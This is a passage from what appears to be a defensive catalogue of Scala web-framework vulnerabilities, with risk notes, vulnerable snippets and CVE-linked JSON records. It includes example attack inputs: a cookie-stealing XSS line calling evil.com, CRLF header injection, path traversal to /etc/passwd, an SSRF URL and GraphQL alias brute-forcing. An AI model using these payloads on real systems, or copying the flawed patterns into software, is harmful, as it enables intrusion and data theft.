{ "sink_id": "SCALA-AKKA-005", "category": "akka", "title": "Akka HTTP getFromDirectory path traversal on Windows", "severity": "high", "sources": [{ "type": "advisory", "url": "https://doc.akka.io/libraries/akka-http/10.0/security/2016-09-30-windows-directory-traversal.html", "title": "Directory Traversal in FileDirectives", "author": "Akka Team", "date": "2016-09-30" }, { "type": "issue", "url": "https://github.com/akka/akka-http/issues/346", "title": "Directory Traversal Attack vulnerability in Akka HTTP getFromDirectory", "author": "akka/akka-http", "date": "2016-09-30" }], "confidence": "confirmed" }
```

### 4.6 Akka HTTP `entity(as[T])` — Missing Size Limit DoS
**Risk**: `entity(as[T])` buffers the entire request body into memory before decoding. Without `withSizeLimit` or a low `akka.http.server.parsing.max-content-length`, an attacker streams an arbitrarily large body causing OOM. Additionally, `decodeRequest` applies `withSizeLimit` to the *compressed* size; gzip-bomb payloads expand beyond the limit after decompression.

```scala
// Missing size guard — attacker sends multi-GB body:
path("upload") {
  entity(as[Array[Byte]]) { bytes => complete(s"Got ${bytes.length} bytes") }
}

// Fix: wrap with explicit limit
withSizeLimit(1024 * 1024) {
  entity(as[Array[Byte]]) { bytes => complete(OK) }
}
// Also set: akka.http.server.parsing.max-content-length = 8m
```

**Ref**: Akka HTTP — `withSizeLimit` directive documentation.

```json
{ "sink_id": "SCALA-AKKA-006", "category": "akka", "title": "Akka HTTP missing withSizeLimit entity body DoS", "severity": "high", "sources": [{ "type": "documentation", "url": "https://doc.akka.io/libraries/akka-http/current/routing-dsl/directives/misc-directives/withSizeLimit.html", "title": "Akka HTTP withSizeLimit directive", "author": "Lightbend", "date": "2024-01-01" }, { "type": "issue", "url": "https://github.com/akka/akka-http/issues/2137", "title": "decodeRequest does not respect withSizeLimit", "author": "akka/akka-http", "date": "2018-10-01" }], "confidence": "confirmed" }
```

### 4.7 Akka HTTP `RawHeader` — CRLF Response Header Injection
**Risk**: `RawHeader(name, value)` performs no sanitisation of `\r\n` sequences. User-controlled values injected into response headers via `RawHeader` allow HTTP response splitting: the attacker terminates the current response and injects a synthetic second response, enabling cache poisoning, XSS via injected `Content-Type`, and session fixation.

```scala
// name or value comes from user input:
val header = RawHeader("X-Request-Id", request.getHeader("X-Forwarded-Id"))
complete(HttpResponse(headers = List(header), entity = "ok"))
// If X-Forwarded-Id = "abc\r\nSet-Cookie: session=evil" → header injection
```

**Ref**: Akka HTTP model — `HttpHeader` / `RawHeader` API.

```json
{ "sink_id": "SCALA-AKKA-007", "category": "akka", "title": "Akka HTTP RawHeader CRLF response header injection", "severity": "high", "sources": [{ "type": "documentation", "url": "https://doc.akka.io/libraries/akka-http/current/common/http-model.html#http-headers", "title": "Akka HTTP HTTP Model — Headers", "author": "Lightbend", "date": "2024-01-01" }], "confidence": "confirmed" }
```

---

## 5. Play Framework / Web

### 5.1 CVE-2022-31018 — DoS via Deep JSON in Form Binding
**Risk**: Deeply nested JSON objects passed to `Form.bindFromRequest` cause OOM.

```scala
case class UserData(name: String, email: String)
val userForm = Form(mapping("name" -> text, "email" -> email)(UserData.apply)(UserData.unapply))
def createUser = Action { implicit request =>
  userForm.bindFromRequest.get  // Deeply nested JSON causes OOM
}
```

**Ref**: GHSA-v8x6-59g4-5g3w / CVE-2022-31018.

```json
{ "sink_id": "SCALA-PLAY-001", "category": "play-framework", "title": "DoS from deeply nested JSON form binding (CVE-2022-31018)", "severity": "high", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31018", "title": "CVE-2022-31018", "author": "NVD", "date": "2022-06-02" }], "confidence": "confirmed" }
```

### 5.2 CVE-2020-27196 — JSON Stack Overflow DoS
**Risk**: Deeply nested JSON sent to any POST endpoint causes `StackOverflowError`.

```scala
// Send Content-Type: application/json with {"a":{"a":{"a":...}}} deeply nested
// Play's body parser recursively parses causing StackOverflowError
```

**Ref**: Play Framework Security Advisory — CVE-2020-27196.

```json
{ "sink_id": "SCALA-PLAY-002", "category": "play-framework", "title": "JSON stack overflow DoS (CVE-2020-27196)", "severity": "high", "sources": [{ "type": "advisory", "url": "https://www.playframework.com/security/vulnerability/CVE-2020-27196-DosViaJsonStackOverflow", "title": "DoS via JSON Stack Overflow", "author": "Play Framework Security Team", "date": "2020-10-01" }], "confidence": "confirmed" }
```

### 5.3 CVE-2020-12480 — CSRF Content-Type Blacklist Bypass
**Risk**: Malformed Content-Type headers bypass Play's CSRF `contentType.blackList` protection.

```scala
// attack: Content-Type: application/json;   ← trailing semicolon bypasses blacklist
// Fix: use whitelist instead of blacklist
play.filters.csrf.contentType.whiteList = ["application/x-www-form-urlencoded"]
```

**Ref**: Kevin Joensen (Doyensec) — CVE-2020-12480.

```json
{ "sink_id": "SCALA-PLAY-003", "category": "play-framework", "title": "CSRF blacklist bypass via malformed Content-Type (CVE-2020-12480)", "severity": "high", "sources": [{ "type": "advisory", "url": "https://www.playframework.com/security/vulnerability/CVE-2020-12480-CsrfBlacklistBypass", "title": "CSRF Content-Type blacklist bypass", "author": "Kevin Joensen (Doyensec)", "date": "2020-08-10" }], "confidence": "confirmed" }
```

### 5.4 CVE-2018-13864 — Assets Path Traversal (Windows)
**Risk**: Path traversal in Assets controller via encoded backslashes.

```scala
// GET /assets/..%5C..%5Cconf%5Capplication.conf
// Windows interprets %5C as backslash — reads conf/application.conf
```

**Ref**: Qihoo360 Redteam — CVE-2018-13864.

```json
{ "sink_id": "SCALA-PLAY-004", "category": "play-framework", "title": "Assets path traversal on Windows (CVE-2018-13864)", "severity": "high", "sources": [{ "type": "advisory", "url": "https://www.playframework.com/security/vulnerability/CVE-2018-13864-PathTraversal", "title": "Path traversal in Assets controller", "author": "Qihoo360 Redteam", "date": "2018-07-16" }], "confidence": "confirmed" }
```

### 5.5 CVE-2017-5929 — Logback SocketAppender Java Deserialization RCE
**Risk**: If Logback is configured with `SocketAppender`, untrusted input is deserialized leading to RCE.

```scala
// conf/logback.xml:
// <appender name="SOCKET" class="ch.qos.logback.classic.net.SocketAppender">
//   <remoteHost>${loghost}</remoteHost><port>4560</port>
// </appender>
// Sending crafted serialized Java object to port 4560 → RCE
```

**Ref**: Joel Berta — CVE-2017-5929.

```json
{ "sink_id": "SCALA-PLAY-005", "category": "play-framework", "title": "Logback SocketAppender deserialization RCE (CVE-2017-5929)", "severity": "critical", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-5929", "title": "CVE-2017-5929", "author": "NVD", "date": "2017-04-07" }], "confidence": "confirmed" }
```

### 5.6 CVE-2014-3630 — XML External Entity (XXE)
**Risk**: Play's Java `play.libs.XML` and `WSResponse.asXml()` process XML with external entities enabled.

**Ref**: David Jorm (Red Hat) — CVE-2014-3630.

```json
{ "sink_id": "SCALA-PLAY-006", "category": "play-framework", "title": "XXE via play.libs.XML and WSResponse.asXml (CVE-2014-3630)", "severity": "high", "sources": [{ "type": "advisory", "url": "https://www.playframework.com/security/vulnerability/CVE-2014-3630-XmlExternalEntity", "title": "XXE vulnerability", "author": "David Jorm (Red Hat)", "date": "2014-10-07" }], "confidence": "confirmed" }
```

### 5.7 Play WS URI Parsing SSRF
**Risk**: AsyncHttpClient improperly parses URI authority with `#`, enabling SSRF via `http://trusted.com#@evil.com/`.

```scala
wsClient.url("http://trusted.com#@evil.com/steal").get()
// Actually connects to evil.com, not trusted.com
```

**Ref**: Nicolas Grégoire (Agarri) — Play WS Security Advisory (2017-08-28).

```json
{ "sink_id": "SCALA-PLAY-007", "category": "play-framework", "title": "WS URI parsing SSRF via authority confusion", "severity": "high", "sources": [{ "type": "advisory", "url": "https://www.playframework.com/security/vulnerability/20170828-InvalidUriParsing", "title": "WS invalid URI parsing", "author": "Nicolas Grégoire (Agarri)", "date": "2017-08-28" }], "confidence": "confirmed" }
```

### 5.8 http4s `FileService` / `staticResource` — Path Traversal (CVE-2020-5280)
**Risk**: http4s `FileService`, `ResourceService`, and `WebjarService` apply URI normalisation incorrectly prior to 0.18.26 / 0.20.20 / 0.21.2. Requests with `../` or `//` segments escape the configured root and serve arbitrary files. Additionally, a non-slash-terminated `pathPrefix` (e.g. `/foo`) matches `/foobaz/…` and maps it under the system root, exposing unintended directory trees.

```scala
// Vulnerable: pathPrefix does not end with /
val service = fileService[IO](FileService.Config("/var/www/app", pathPrefix = "/static"))
// GET /staticevil/../../../etc/passwd → serves /var/www/appevil/../../../etc/passwd
// after incorrect normalisation: /etc/passwd
```

**Ref**: GHSA-66q9-f7ff-mmx6 / CVE-2020-5280 — http4s static content path traversal.

```json
{ "sink_id": "SCALA-HTTP4S-001", "category": "play-framework", "title": "http4s FileService/staticResource path traversal (CVE-2020-5280)", "severity": "high", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-5280", "title": "CVE-2020-5280 — http4s local file inclusion", "author": "NVD", "date": "2020-03-20" }, { "type": "documentation", "url": "https://http4s.org/v1/docs/static.html", "title": "http4s Static Files", "author": "http4s Contributors", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 5.9 Tapir `decodeFailureHandler` Info Disclosure + `serverSecurityLogic` Bypass via Extractor Ordering
**Risk**: Two distinct risks. (1) Default `decodeFailureHandler` returns the raw decode error message including field names and expected types in the HTTP response body — information disclosure useful for mapping internal data models. (2) When multiple `serverSecurityLogic` extractors are composed via `andThen`, partial extractors that return `Right` on parse failure (instead of `Left`) silently skip authentication for malformed inputs, because tapir short-circuits on the first `Right`.

```scala
// Risk 1: default failure handler leaks schema info
val ep = endpoint.in(jsonBody[InternalRequest])
  // decodeFailureHandler returns: "Invalid value for: body (missing field 'adminToken' ...)"

// Risk 2: misordered security logic — lenient extractor first
val secured = ep
  .serverSecurityLogic(lenientExtractor)  // returns Right(AnonymousUser) on bad token
  .andThen(strictExtractor)               // never reached for malformed inputs
```

**Ref**: Tapir documentation — Error handling; Server security logic.

```json
{ "sink_id": "SCALA-TAPIR-001", "category": "play-framework", "title": "Tapir decodeFailureHandler info disclosure + serverSecurityLogic bypass", "severity": "medium", "sources": [{ "type": "documentation", "url": "https://tapir.softwaremill.com/en/latest/server/errors.html", "title": "Tapir — Error Handling", "author": "SoftwareMill", "date": "2024-01-01" }, { "type": "documentation", "url": "https://tapir.softwaremill.com/en/latest/server/logic.html", "title": "Tapir — Server Security Logic", "author": "SoftwareMill", "date": "2024-01-01" }], "confidence": "likely" }
```

### 5.10 ZIO HTTP `Routes` Path Overlap + `Body.fromStream` Unbounded Read
**Risk**: Two distinct risks. (1) ZIO HTTP `Routes` evaluates patterns in definition order without duplicate-detection; overlapping patterns cause silently unreachable routes, allowing a more-permissive handler to match requests intended for a restrictive one. (2) `Body.fromStream(stream)` with no size bound reads an unbounded ZStream into memory, enabling OOM via large request bodies.

```scala
// Risk 1: overlapping routes — admin route unreachable
val routes = Routes(
  Method.GET / "api" / string("id") -> handler { (id: String, _: Request) => adminHandler(id) },
  Method.GET / "api" / "admin"      -> handler { (_: Request) => restrictedHandler }  // DEAD
)

// Risk 2: unbounded body read
def upload(req: Request) =
  Body.fromStream(req.body.asStream)  // no limit — attacker sends infinite stream
```

**Ref**: ZIO HTTP documentation — Routes; Body.

```json
{ "sink_id": "SCALA-ZIOHTTP-001", "category": "play-framework", "title": "ZIO HTTP route overlap shadow + Body.fromStream unbounded read DoS", "severity": "medium", "sources": [{ "type": "documentation", "url": "https://zio.dev/zio-http/reference/body/", "title": "ZIO HTTP — Body", "author": "ZIO Contributors", "date": "2024-01-01" }, { "type": "issue", "url": "https://github.com/zio/zio-http/issues/2679", "title": "Improve Routes DSL to support complex URI template patterns", "author": "zio/zio-http", "date": "2023-08-01" }], "confidence": "likely" }
```

### 5.11 Twirl Auto-Escaping — Non-HTML Contexts (JS / CSS / Event Handlers)
**Risk**: Twirl's `@variable` interpolation applies HTML entity escaping only. Inside `<script>` blocks, `style="..."` attributes, and event-handler attributes (`onclick="@var"`), HTML escaping is **insufficient** — the output is not JavaScript-safe or CSS-safe. An attacker supplies `</script><script>alert(1)//` or `x;alert(1)` which HTML-escapes to a harmless-looking string that is nonetheless valid JavaScript breaking the script context. `@Html(value)` is the documented bypass but ordinary `@` interpolation in non-HTML contexts is equally dangerous.

```scala
// Vulnerable Twirl template (views/index.scala.html):
<script>
  var userId = "@userId";        // attacker: "; fetch('//evil.com?c='+document.cookie);//
  var config = @Json.toJson(cfg); // attacker controls cfg structure
</script>
<div onclick="handle('@action')">click</div>  // attacker: '); evil();//
```

**Ref**: Play Twirl documentation — Templates syntax; HTML escaping behaviour.

```json
{ "sink_id": "SCALA-TWIRL-001", "category": "play-framework", "title": "Twirl @variable unsafe in JS/CSS/event-handler contexts", "severity": "high", "sources": [{ "type": "documentation", "url": "https://www.playframework.com/documentation/latest/ScalaTemplates", "title": "Play Twirl Templates — Escaping", "author": "Play Framework", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 5.12 Play Session Cookie Storing Authorization State
**Risk**: Play's session cookie is **signed but not encrypted by default** — any data placed in `request.session` is readable by the client. Storing `userId`, role, tenant, or feature flags in the session means a client who captures the cookie can read privileges, and a developer relying on the session value as a security boundary can be tricked when combined with any cookie-fixation or replay primitive. Play's official Security Guide explicitly warns: "do not store critical data in session cookies."

```scala
// ANTI-PATTERN — exposes role and userId to client; no integrity coupling to user state
Action { implicit request =>
  Ok(view).withSession("userId" -> id.toString, "role" -> "admin")
}
// Authorization check trusts a value the client can read (and replay):
def adminOnly = Action { req =>
  if (req.session.get("role").contains("admin")) Ok(secret) else Forbidden
}
```

**Ref**: Play Framework Security Guide — Session cookies / "Keep your secret secret".

```json
{ "sink_id": "SCALA-PLAY-008", "category": "play-framework", "title": "Play session cookie stores authorization state (signed, not encrypted)", "severity": "high", "sources": [{ "type": "documentation", "url": "https://www.playframework.com/documentation/latest/ScalaSessionFlash", "title": "Play Session and Flash scopes", "author": "Play Framework", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 5.13 http4s CORS `anyOrigin` / Origin Reflection Misconfiguration
**Risk**: `CORS.policy.withAllowOriginAll` (or origin-reflection patterns that echo `Origin` back into `Access-Control-Allow-Origin`) combined with `withAllowCredentialsTrue` permits credentialed cross-origin requests from any site — full session theft via CSRF-with-credentials. Past http4s advisories track exactly this configuration footgun.

```scala
import org.http4s.server.middleware.CORS
val service = CORS.policy
  .withAllowOriginAll                  // or: .withAllowOriginHostCi(_ => true)
  .withAllowCredentials(true)          // FATAL combination
  .apply(routes)
```

**Ref**: http4s CORS middleware documentation; http4s GitHub Security Advisories (response/origin reflection class).

```json
{ "sink_id": "SCALA-HTTP4S-002", "category": "play-framework", "title": "http4s CORS allowOriginAll + allowCredentials credential theft", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://http4s.org/v0.23/docs/cors.html", "title": "http4s CORS middleware", "author": "http4s", "date": "2024-01-01" }, { "type": "advisory", "url": "https://github.com/http4s/http4s/security/advisories", "title": "http4s Security Advisories", "author": "http4s", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 5.14 http4s Response Header Splitting via User-Controlled Header Values
**Risk**: http4s historically had advisories around response/request splitting where untrusted CRLF in header values yielded log injection or, in older versions, header splitting and cache poisoning. Even on patched http4s, application code that builds `Header.Raw` from user input retains the risk class.

```scala
import org.http4s.{Header, Headers, Response}
val resp = Response[IO](Status.Ok)
  .withHeaders(Header.Raw(ci"X-User", request.params("name")))  // CRLF in name → split
```

**Ref**: http4s GitHub Security Advisories (response splitting).

```json
{ "sink_id": "SCALA-HTTP4S-003", "category": "play-framework", "title": "http4s Header.Raw response splitting via CRLF", "severity": "high", "sources": [{ "type": "advisory", "url": "https://github.com/http4s/http4s/security/advisories", "title": "http4s Security Advisories — response splitting", "author": "http4s", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 5.15 Sangria GraphQL — Query Depth / Complexity DoS
**Risk**: Sangria executes GraphQL queries without depth/complexity limits by default. Adversarial nested introspection or recursive object queries exhaust CPU and memory. Mitigation requires `QueryReducer.measureComplexity` and `QueryReducer.rejectMaxDepth` — both opt-in.

```scala
import sangria.execution._
// Vulnerable: no reducers configured
Executor.execute(schema, query)
// Hardened:
val reducers = List(
  QueryReducer.rejectMaxDepth(10),
  QueryReducer.rejectComplexity(1000)
)
Executor.execute(schema, query, queryReducers = reducers)
```

**Ref**: Sangria documentation — Query Reducers / Limiting Query Complexity.

```json
{ "sink_id": "SCALA-GRAPHQL-001", "category": "play-framework", "title": "Sangria GraphQL missing depth/complexity limits", "severity": "high", "sources": [{ "type": "documentation", "url": "https://sangria-graphql.github.io/learn/", "title": "Sangria — Query Reducers", "author": "Sangria", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 5.16 Sangria / Caliban GraphQL Introspection Enabled in Production
**Risk**: Both Sangria and Caliban expose full schema introspection by default. In production this leaks internal types, mutations, and field arguments — substantially lowering the bar for attackers who then enumerate sensitive operations and craft targeted abuse queries. Caliban's `wrappers.Wrapper` and Sangria's `IntrospectionSchemaBuilder` allow disabling but require explicit code.

```scala
// Caliban: introspection enabled by default unless wrapped
import caliban.wrappers.Wrappers._
val api = graphQL(resolver) @@ maxDepth(10)  // does NOT disable introspection
// Disable: filter out __schema / __type fields via custom Wrapper
```

**Ref**: Caliban docs — Wrappers; Sangria docs — Introspection.

```json
{ "sink_id": "SCALA-GRAPHQL-002", "category": "play-framework", "title": "Sangria/Caliban introspection exposed in production", "severity": "medium", "sources": [{ "type": "documentation", "url": "https://ghostdogpr.github.io/caliban/docs/middleware.html", "title": "Caliban Wrappers", "author": "Pierre Ricadat", "date": "2024-01-01" }, { "type": "documentation", "url": "https://sangria-graphql.github.io/learn/", "title": "Sangria — Introspection", "author": "Sangria", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 5.17 Sangria GraphQL Query Batching — Authorization Bypass via Aliases
**Risk**: GraphQL aliases let one HTTP request execute many copies of the same field with different arguments. If rate limiting / auth is enforced at the HTTP request level, aliases bypass it (e.g. brute-force login mutations). Sangria does not collapse aliased fields by default.

```graphql
mutation BatchLogin {
  a1: login(user:"admin", pass:"a") { token }
  a2: login(user:"admin", pass:"b") { token }
  a3: login(user:"admin", pass:"c") { token }
  # ... thousands of aliases in one request
}
```

**Ref**: GraphQL aliases attack — PortSwigger Web Security Academy.

```json
{ "sink_id": "SCALA-GRAPHQL-003", "category": "play-framework", "title": "Sangria/Caliban alias batching bypasses per-request rate limits", "severity": "high", "sources": [{ "type": "documentation", "url": "https://portswigger.net/web-security/graphql", "title": "PortSwigger — GraphQL API vulnerabilities", "author": "PortSwigger", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 5.18 http4s-ember Chunked Trailer Request Smuggling (GHSA-wcwh-7gfw-5wrr)
**Risk**: `http4s-ember-core`'s chunked transfer-encoding trailer parser terminates without consuming the required double CRLF, leaving unparsed bytes in the buffer that the downstream server interprets as a second request. Exploitable behind a reverse-proxy that forwards trailer headers — leads to cache poisoning and security-control bypass for active users. Affects versions before 0.23.31 and 1.0.0-M45.

```scala
// Vulnerable: any ember server <0.23.31 / <1.0.0-M45 fronted by a CRLF-tolerant proxy
EmberServerBuilder.default[IO].withHttpApp(routes).build
// Smuggled second request hidden in chunked trailers reaches downstream as a
// new request attributed to a victim's connection
```

**Ref**: http4s GHSA-wcwh-7gfw-5wrr — Ember chunked trailer parser.

```json
{ "sink_id": "SCALA-HTTP4S-004", "category": "play-framework", "title": "http4s-ember chunked-trailer HTTP request smuggling", "severity": "high", "sources": [{ "type": "advisory", "url": "https://github.com/http4s/http4s/security/advisories/GHSA-wcwh-7gfw-5wrr", "title": "http4s-ember chunked trailer smuggling", "author": "http4s", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 5.19 http4s Typed-Header Parse Fatal Throw — Unauth DoS (CVE-2023-22465)
**Risk**: `req.headers.get[User-Agent]` (and `Server`) trigger lazy parsing that throws a fatal `Throwable` (not a recoverable exception) on certain malformed inputs — crashes the JVM. Single crafted header from any unauthenticated client takes the process down. Affects 0.21.0–0.21.33, 0.22.0–0.22.14, 0.23.0–0.23.16, 1.0.0-M1–M37. CVSS 7.5.

```scala
// Vulnerable typed accessor — invoking it throws on a crafted User-Agent
val ua = req.headers.get[`User-Agent`]
// Attacker: User-Agent: \x00\x01...\x7f → fatal throw
```

**Ref**: CVE-2023-22465 / GHSA-54w6-vxfh-fw7f.

```json
{ "sink_id": "SCALA-HTTP4S-005", "category": "play-framework", "title": "http4s typed-header parse fatal-throw DoS (CVE-2023-22465)", "severity": "high", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22465", "title": "CVE-2023-22465", "author": "NVD", "date": "2023-01-09" }, { "type": "advisory", "url": "https://github.com/http4s/http4s/security/advisories/GHSA-54w6-vxfh-fw7f", "title": "http4s typed-header fatal throw", "author": "http4s", "date": "2023-01-09" }], "confidence": "confirmed" }
```

### 5.20 http4s-blaze Unbounded Connection Acceptance (GHSA-xhv5-w9c5-2r2w)
**Risk**: `blaze-core` accepted TCP connections into an unbounded queue *before* http4s-level `MaxActiveRequests` middleware could shed load — a connection-flood attacker exhausts OS file descriptors regardless of application-layer rate limits. Fixed in 0.21.18+ via `maxConnections` (default 1024). Distinct from `Body.fromStream` body-level DoS — this is at the transport layer.

```scala
// Vulnerable on blaze < 0.21.18:
BlazeServerBuilder[IO].bindHttp(8080).withHttpApp(app).resource
// MaxActiveRequests middleware does NOT prevent FD exhaustion
```

**Ref**: http4s GHSA-xhv5-w9c5-2r2w.

```json
{ "sink_id": "SCALA-HTTP4S-006", "category": "play-framework", "title": "http4s-blaze unbounded TCP accept queue FD exhaustion", "severity": "high", "sources": [{ "type": "advisory", "url": "https://github.com/http4s/http4s/security/advisories/GHSA-xhv5-w9c5-2r2w", "title": "blaze-core unbounded connection acceptance", "author": "http4s", "date": "2021-01-01" }], "confidence": "confirmed" }
```

### 5.21 http4s-async-http-client Decompression Bomb (GHSA-8hxh-r6f7-jf45)
**Risk**: The async-http-client backend (≤ 0.21.7) passes compressed responses through Netty codec 4.1.45 without a decompression size limit. A malicious server returns a tiny gzip body that decompresses to gigabytes — OOMs the *client* JVM. Client-side sink: applies when your Scala service makes outbound HTTP to untrusted remotes.

```scala
// Vulnerable client:
val client: Client[IO] = AsyncHttpClient.resource[IO]().use { c =>
  c.expect[String]("https://attacker.example/bomb.gz")  // OOM via 1KB → 1GB
}
```

**Ref**: http4s GHSA-8hxh-r6f7-jf45.

```json
{ "sink_id": "SCALA-HTTP4S-007", "category": "play-framework", "title": "http4s-async-http-client decompression bomb client OOM", "severity": "medium", "sources": [{ "type": "advisory", "url": "https://github.com/http4s/http4s/security/advisories/GHSA-8hxh-r6f7-jf45", "title": "async-http-client decompression bomb", "author": "http4s", "date": "2020-01-01" }], "confidence": "confirmed" }
```

### 5.22 http4s CORS Origin Reflection + Null-Origin (CVE-2021-39185)
**Risk**: The original `CORSConfig` / `CORS` middleware (deprecated after the fix) reflected the request's `Origin` header verbatim into `Access-Control-Allow-Origin` and accepted the `null` origin. With `allowCredentials`, any site (or sandboxed iframe with `null` origin) gains full authenticated cross-origin read. CVSS 9.1. Fixed in 0.21.27 / 0.22.3 / 0.23.2 / 1.0.0-M25. Distinct from §5.13 `allowOriginAll` — this is an even subtler bug because origin allow-listing *appeared* to be in effect.

```scala
import org.http4s.server.middleware.CORS
// Vulnerable: legacy CORSConfig with anyOrigin OR sandboxed-iframe Null-Origin trust
CORS(routes, CORSConfig(anyOrigin = true, allowCredentials = true, maxAge = 1.day))
```

**Ref**: CVE-2021-39185 / GHSA-52cf-226f-rhr6.

```json
{ "sink_id": "SCALA-HTTP4S-008", "category": "play-framework", "title": "http4s legacy CORS origin reflection + Null-Origin (CVE-2021-39185)", "severity": "critical", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-39185", "title": "CVE-2021-39185", "author": "NVD", "date": "2021-09-13" }, { "type": "advisory", "url": "https://github.com/http4s/http4s/security/advisories/GHSA-52cf-226f-rhr6", "title": "http4s CORS origin reflection", "author": "http4s", "date": "2021-09-13" }], "confidence": "confirmed" }
```

### 5.23 http4s `StaticFile.fromUrl` Directory-Presence Oracle (GHSA-6h7w-fc84-x7p6)
**Risk**: `StaticFile.fromUrl` leaks whether a path is a directory (vs. nonexistent) through response timing/shape, enabling filesystem enumeration even when directory listing is disabled. Distinct CWE from §5.8 path traversal — this is information disclosure via oracle.

```scala
StaticFile.fromUrl(url, blocker)  // returns OptionT differently for "directory" vs "missing"
```

**Ref**: http4s GHSA-6h7w-fc84-x7p6.

```json
{ "sink_id": "SCALA-HTTP4S-009", "category": "play-framework", "title": "http4s StaticFile.fromUrl directory-presence oracle", "severity": "low", "sources": [{ "type": "advisory", "url": "https://github.com/http4s/http4s/security/advisories/GHSA-6h7w-fc84-x7p6", "title": "StaticFile.fromUrl directory disclosure", "author": "http4s", "date": "2021-01-01" }], "confidence": "confirmed" }
```

### 5.24 GraphQL Schema Suggestion Leakage (Clairvoyance)
**Risk**: Sangria / Caliban / Apollo-compatible servers return "Did you mean X?" field-name suggestions even when introspection is disabled. Tools like Clairvoyance reconstruct a near-complete schema from suggestions alone. Regex-based introspection blocks (e.g., disallowing `__schema`) are bypassable via embedded newlines, comments, or whitespace.

```graphql
# Even with introspection disabled, error responses leak schema:
{ usr(id:1) { id } }
# → "Field 'usr' doesn't exist on type 'Query'. Did you mean 'user', 'users'?"
```

**Ref**: Clairvoyance project; PortSwigger GraphQL API vulnerabilities.

```json
{ "sink_id": "SCALA-GRAPHQL-004", "category": "play-framework", "title": "GraphQL field-suggestion leakage (Clairvoyance)", "severity": "medium", "sources": [{ "type": "documentation", "url": "https://portswigger.net/web-security/graphql", "title": "PortSwigger — GraphQL API vulnerabilities", "author": "PortSwigger", "date": "2024-01-01" }, { "type": "github", "url": "https://github.com/nikitastupin/clairvoyance", "title": "Clairvoyance — schema reconstruction", "author": "Nikita Stupin", "date": "2020-01-01" }], "confidence": "confirmed" }
```

### 5.25 GraphQL CSRF via GET / Simple Content-Type
**Risk**: GraphQL endpoints that accept queries via HTTP `GET` or `Content-Type: application/x-www-form-urlencoded` POST are valid simple-CORS requests — no preflight, browser auto-submits with session cookies. Mutations can be triggered cross-origin without an attacker reading a token. Sangria-akka-http and Caliban-akka-http both default-accept these.

```scala
// Vulnerable Sangria route — accepts GET ?query=mutation+...:
path("graphql") {
  get { parameters("query") { q => ... execute Sangria ... } }   // CSRF-able
}
// Mitigation: require Content-Type: application/json AND custom header
```

**Ref**: PortSwigger GraphQL API vulnerabilities — CSRF section.

```json
{ "sink_id": "SCALA-GRAPHQL-005", "category": "play-framework", "title": "GraphQL CSRF via GET/x-www-form-urlencoded simple content type", "severity": "high", "sources": [{ "type": "documentation", "url": "https://portswigger.net/web-security/graphql", "title": "PortSwigger — GraphQL CSRF", "author": "PortSwigger", "date": "2024-01-01" }], "confidence": "confirmed" }
```

---

## 6. Collections & Lazy Evaluation

### 6.1 ListBuffer `toList` Race — Immutable List Mutable During Construction (SI-9462)
**Risk**: `ListBuffer.toList` shares internal buffer — concurrent `ListBuffer` mutation after `toList` can modify the "immutable" list.

```scala
val buf = ListBuffer(1, 2, 3)
new Thread(() => { buf += 4 }).start()  // mutations race with toList
val snap = buf.toList  // "immutable" list shares buffer with buf
```

**Ref**: scala/bug#9462.

```json
{ "sink_id": "SCALA-COLL-001", "category": "collections", "title": "ListBuffer toList race mutates immutable list (SI-9462)", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/9462", "title": "Race condition may cause newly-created List to mutate", "author": "scabug", "date": "2016-03-30" }], "confidence": "confirmed" }
```

### 6.2 Parallel Collections Shared Mutable State Race
**Risk**: Scala parallel collections (`par`) accumulate into shared mutable state without synchronization — corrupts auth decisions, counters, etc.

```scala
var balance = 0
(1 to 10000).par.foreach(i => balance += i)  // race condition
```

**Ref**: Scala Parallel Collections Overview (explicit side-effect warning).

```json
{ "sink_id": "SCALA-COLL-002", "category": "collections", "title": "Parallel collections shared mutable state race", "severity": "high", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/overviews/parallel-collections/overview.html", "title": "Parallel Collections Overview", "author": "scala-lang.org", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 6.3 LazyList Memory Exhaustion via Unbounded Forcing
**Risk**: An attacker who controls the number of forced elements from `LazyList` triggers OOM.

```scala
LazyList.from(0).take(userLimit).toList  // OOM if userLimit is large
```

**Ref**: scala/bug#10843; scala/scala3#25777.

```json
{ "sink_id": "SCALA-COLL-003", "category": "collections", "title": "LazyList memory exhaustion via unbounded forcing", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/10843", "title": "LazyList potential memory leak", "author": "xuwei-k", "date": "2018-12-14" }], "confidence": "confirmed" }
```

### 6.4 IterableOnce Single-Use — Logic Bypass
**Risk**: `Iterator` / `IterableOnce` is single-traversal. Code reusing it across multiple operations silently skips second pass — bypassing security checks.

```scala
def validateTokens(ids: IterableOnce[Int]): Boolean = {
  val count = ids.iterator.size       // first traversal — consumes iterator
  if (count > 100) return false
  ids.iterator.foreach(isMalicious(_)) // second traversal — SKIPPED silently
  true  // always returns true
}
```

**Ref**: Alexandru Nedelcu — "Why Scala's Traversable Is Bad Design".

```json
{ "sink_id": "SCALA-COLL-004", "category": "collections", "title": "IterableOnce single-use statefulness causes logic bypass", "severity": "high", "sources": [{ "type": "blog", "url": "https://alexn.org/blog/2017/01/13/traversable/", "title": "Why Scala's Traversable Is Bad Design", "author": "Alexandru Nedelcu", "date": "2017-01-13" }], "confidence": "confirmed" }
```

### 6.5 ArraySeq `unsafeArray` Type Confusion
**Risk**: `ArraySeq.unsafeArray` exposes erased type — after `map`, the array type changes silently from `Array[Int]` to `Array[Object]`.

